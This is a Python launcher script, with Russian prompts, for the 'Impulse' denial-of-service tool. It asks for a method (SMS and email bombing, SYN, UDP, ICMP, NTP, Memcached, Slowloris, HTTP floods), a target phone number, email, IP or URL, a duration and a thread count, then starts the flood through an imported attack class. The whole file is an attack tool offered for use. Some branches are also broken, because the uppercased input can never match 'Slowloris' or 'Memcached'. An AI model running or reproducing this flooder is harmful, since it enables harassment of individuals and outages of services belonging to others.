# Created by LimerBoy
# Import modules
import os
import sys
import argparse
from tools.crash import CriticalError
import tools.addons.clean
import tools.addons.logo
import tools.addons.winpcap
from tools.method import AttackMethod

# Go to current dir
os.chdir(os.path.dirname(os.path.realpath(__file__)))


method = input('Введите метод(SMS/EMAIL/NTP/UDP/SYN/ICMP/POD/SLOWLORIS/MEMCACHED/HTTP): ').upper()
if method == "SMS":
	target = input('Введите номер: ')
	time = int(input('Введите время(в секундах): '))
	threads = int(input('Введите кол-во потоков: '))
elif method == "EMAIL":
	target = input('Введите Email: ')
	time = int(input('Введите время(в секундах): '))
	threads = int(input('Введите кол-во потоков: '))
elif method == "NTP":
	target = input('Введите адрес(IP:PORT): ')
	time = int(input('Введите время(в секундах): '))
	threads = int(input('Введите кол-во потоков: '))
elif method == "SYN":
	target = input('Введите адрес(IP:PORT): ')
	time = int(input('Введите время(в секундах): '))
	threads = int(input('Введите кол-во потоков: '))
elif method == "UDP":
	target = input('Введите адрес(IP:PORT): ')
	time = int(input('Введите время(в секундах): '))
	threads = int(input('Введите кол-во потоков: '))
elif method == "POD":
	target = input('Введите адрес(IP): ')
	time = int(input('Введите время(в секундах): '))
	threads = int(input('Введите кол-во потоков: '))
elif method == "ICMP":
	target = input('Введите адрес(IP:PORT): ')
	time = int(input('Введите время(в секундах): '))
	threads = int(input('Введите кол-во потоков: '))
elif method == "HTTP":
	target = input('Введите адрес(URL): ')
	time = int(input('Введите время(в секундах): '))
	threads = int(input('Введите кол-во потоков: '))
elif method == "Slowloris":
	target = input('Введите адрес(IP:PORT): ')
	time = int(input('Введите время(в секундах): '))
	threads = int(input('Введите кол-во потоков: '))
elif method == "Memcached":
	target = input('Введите адрес(IP:PORT): ')
	time = int(input('Введите время(в секундах): '))
	threads = int(input('Введите кол-во потоков: '))
else:
	print('Читай https://github.com/LimerBoy/Impulse')



    # Print help


    # Run ddos attack
with AttackMethod(
    duration=time, name=method, threads=threads, target=target
    ) as Flood:
    Flood.Start()
